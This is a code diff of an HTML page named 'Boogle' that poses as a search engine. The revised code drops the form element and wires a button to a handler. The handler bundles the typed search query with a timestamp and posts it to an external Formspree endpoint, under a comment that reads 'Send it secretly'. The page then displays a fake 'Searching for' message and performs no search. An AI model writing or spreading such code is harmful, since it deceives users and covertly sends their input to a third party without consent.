@@ -100,25 +100,22 @@
   <h1>Boogle</h1>
 
   <div class="search-container">
-    <form id="boogleForm">
-      <input type="text" name="searchQuery" id="searchInput" placeholder="Type your search here..." required />
-      <button type="submit">Search</button>
-    </form>
+    <!-- NO form tag with action -->
+    <input type="text" id="searchInput" placeholder="Type your search here..." required />
+    <button id="searchBtn">Search</button>
   </div>
 
   <div class="message" id="msgBox"></div>
 
   <script>
-    const form = document.getElementById('boogleForm');
     const searchInput = document.getElementById('searchInput');
     const msgBox = document.getElementById('msgBox');
+    const searchBtn = document.getElementById('searchBtn');
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault(); // Prevent default form action
+    searchBtn.addEventListener('click', () => {
+      const searchQuery = searchInput.value.trim();
 
-      const searchQuery = searchInput.value;
-
-      if (!searchQuery.trim()) {
+      if (!searchQuery) {
         msgBox.textContent = "Please enter a search query.";
         return;
       }
@@ -143,31 +140,34 @@
 
       const time = `${hours}:${minutes}:${seconds} ${ampm}`;
 
-      // Send data via fetch to Formspree
+      // Build JSON payload
+      const data = {
+        searchQuery,
+        day,
+        date,
+        month,
+        time
+      };
+
+      // Send it secretly
       fetch('https://formspree.io/f/xldnvweb', {
         method: 'POST',
         headers: {
           'Accept': 'application/json',
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({
-          searchQuery,
-          day,
-          date,
-          month,
-          time
-        })
+        body: JSON.stringify(data)
       })
       .then(response => {
         if (response.ok) {
           msgBox.textContent = `Searching for "${searchQuery}"...`;
           searchInput.value = '';
         } else {
-          msgBox.textContent = "Oops! Something went wrong.";
+          msgBox.textContent = "Oops! Couldn't send your request.";
         }
       })
       .catch(() => {
-        msgBox.textContent = "Error: Unable to submit data.";
+        msgBox.textContent = "Something went wrong. Try again.";
       });
     });
   </script>
